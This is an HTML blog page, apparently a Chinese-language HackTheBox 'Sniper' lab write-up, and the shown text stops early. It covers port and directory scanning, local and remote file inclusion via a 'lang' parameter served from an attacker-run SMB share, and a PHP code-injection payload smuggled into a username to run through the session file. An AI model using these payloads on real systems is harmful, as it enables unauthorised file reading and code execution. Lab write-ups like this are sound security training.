@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Sniper - T0x1c</title>
+
+  
+    <meta name="description" content="Sniper是一个中等难度的靶机，知识点涉及本地文件包含利用、远程文件包含利用、凭证制作、恶意chm文件利用等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Sniper">
+<meta property="og:url" content="https://toxic80l.github.io/post/8461de82/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Sniper是一个中等难度的靶机，知识点涉及本地文件包含利用、远程文件包含利用、凭证制作、恶意chm文件利用等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-04%20%E4%B8%8B%E5%8D%883.24.52.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0360.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/Sniper.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%882.13.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.19.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.45.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.47.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.53.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.28.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.29.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.33.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8A%E5%8D%8811.34.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%882.49.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%882.50.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.30.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.14.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.30.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.33.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.35.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.40.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.52.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.04.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.55.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%885.28.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.10.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.37.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.51.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.04.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.09.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.36.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.48.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.54.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.00.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.10.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.12.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.13.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.15.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2018-03-10%20%E4%B8%8A%E5%8D%8811.35.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.24.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.38.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.52.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.56.26.png">
+<meta property="article:published_time" content="2022-03-10T08:05:48.000Z">
+<meta property="article:modified_time" content="2022-03-10T08:29:55.980Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="powershell">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="chm">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-04%20%E4%B8%8B%E5%8D%883.24.52.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#blog"><span class="toc-text">blog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user"><span class="toc-text">user</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-iusr"><span class="toc-text">0x02 上线[iusr]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">验证文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E7%BA%BF"><span class="toc-text">本地文件包含上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8A%E7%BA%BF"><span class="toc-text">远程文件包含上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-chris"><span class="toc-text">0x03 权限提升[chris]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-text">获取凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-administrator"><span class="toc-text">0x04 权限提升[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8Fchm"><span class="toc-text">恶意chm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-03-10T08:05:48.000Z">2022-03-10</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Sniper</span></h1>
+<p>Sniper是一个中等难度的靶机，知识点涉及本地文件包含利用、远程文件包含利用、凭证制作、恶意chm文件利用等。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-04%20%E4%B8%8B%E5%8D%883.24.52.png" alt="截屏2022-03-04 下午3.24.52"></p>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0360.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span><u>通关思维导图</u>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/Sniper.png" alt="Json"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先使用 nmap 进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.151 -oA nmap_Sniper</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%882.13.18.png" alt="截屏2022-03-07 下午2.13.18"></p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问后发现是一家名为 Sniper Co. 的公司，主要业务是快递<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.19.55.png" alt="截屏2022-03-07 下午4.19.55"></p>
+<p>点击<code>Our servers</code>会跳转至<code>/blog/index.php</code>，点击<code>User Portal</code>会跳转至<code>/user/login.php</code>登陆界面</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用 gobuster 进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.45.49.png" alt="截屏2022-03-07 下午4.45.49"></p>
+<h4 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h4><p>在博客中存在语言下拉框，分别是<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.47.53.png" alt="截屏2022-03-07 下午4.47.53"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">http://10.10.10.151/blog/?lang=blog-en.php</span></span><br><span class="line"><span class="string">http://10.10.10.151/blog/?lang=blog-es.php</span></span><br><span class="line"><span class="string">http://10.10.10.151/blog/?lang=blog-fr.php</span></span><br></pre></td></tr></table></figure>
+<p>三种语言界面都在同一个目录中，可以判断它是通过 php 代码<code>include $_GET[&#39;lang&#39;]</code>对其进行包含，如果过滤不严谨的话则可能存在文件包含漏洞</p>
+<h4 id="user"><a href="#user" class="headerlink" title="user"></a>user</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.53.17.png" alt="截屏2022-03-07 下午4.53.17"><br>在登陆界面下面有一个注册界面，尝试注册账户<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.28.17.png" alt="截屏2022-03-07 下午5.28.17"><br>使用新注册的账户 admin/admin 登陆其中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.29.44.png" alt="截屏2022-03-07 下午5.29.44"></p>
+<h2 id="0x02-上线-iusr"><a href="#0x02-上线-iusr" class="headerlink" title="0x02 上线[iusr]"></a>0x02 上线[iusr]</h2><h3 id="验证文件包含"><a href="#验证文件包含" class="headerlink" title="验证文件包含"></a>验证文件包含</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>首先尝试读取上次目录的<code>index.php</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%885.33.23.png" alt="截屏2022-03-07 下午5.33.23"><br>显示无法读取，但是使用绝对路径<code>\windows\win.ini</code>则能够读取成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8A%E5%8D%8811.34.03.png" alt="截屏2022-03-08 上午11.34.03"></p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>使用 smbserver 在本地开启 smb 服务，并在该目录下放置一个文本文件<code>mac.txt</code>，内容为<code>mac is good</code>，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -smb2support mac ~/hackthebox/Machines/Sniper/</span><br></pre></td></tr></table></figure>
+<p>尝试请求远程文件地址：<code>\\10.10.14.7\mac\mac.txt</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%882.49.55.png" alt="截屏2022-03-08 下午2.49.55"><br>成功请求到<code>mac.txt</code>当中的内容，查看响应发现靶机已向本地发送请求<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%882.50.10.png" alt="截屏2022-03-08 下午2.50.10"><br>如果 smb 服务建立出现问题也可以使用以下方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">mac</span>]</span><br><span class="line">    <span class="string">path</span> <span class="string">=</span> <span class="string">/root/hackthebox/Machines/Sniper/</span></span><br><span class="line">    <span class="string">browseable</span> <span class="string">=</span> <span class="literal">yes</span></span><br><span class="line">    <span class="string">read</span> <span class="string">only</span> <span class="string">=</span> <span class="literal">no</span></span><br><span class="line">    <span class="string">create</span> <span class="string">mask</span> <span class="string">=</span> <span class="number">777</span></span><br><span class="line">    <span class="string">guest</span> <span class="string">ok</span> <span class="string">=</span> <span class="literal">yes</span></span><br><span class="line">    <span class="string">force</span> <span class="string">user</span> <span class="string">=</span> <span class="string">nobody</span></span><br><span class="line">    <span class="string">force</span> <span class="string">group</span> <span class="string">=</span> <span class="string">nogroup</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.30.38.png" alt="截屏2022-03-08 下午4.30.38"><br>开启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service smbd restart</span><br><span class="line">service nmbd restart</span><br></pre></td></tr></table></figure>
+<h3 id="本地文件包含上线"><a href="#本地文件包含上线" class="headerlink" title="本地文件包含上线"></a>本地文件包含上线</h3><p>在 Windows 中默认会话地址是<code>\windows\temp</code>目录，登陆账户后我们可以获取到 PHPSESSID 为<code>8b23pbv8tj4m02qisnape584d8</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.14.44.png" alt="截屏2022-03-08 下午3.14.44"><br>这样我们就能够推断 PHP 会话文件为<code>\windows\temp\sess_8b23pbv8tj4m02qisnape584d8</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.30.31.png" alt="截屏2022-03-08 下午3.30.31"><br>接下来尝试在注册界面中的用户名中写入 PHP 执行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;whoami&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
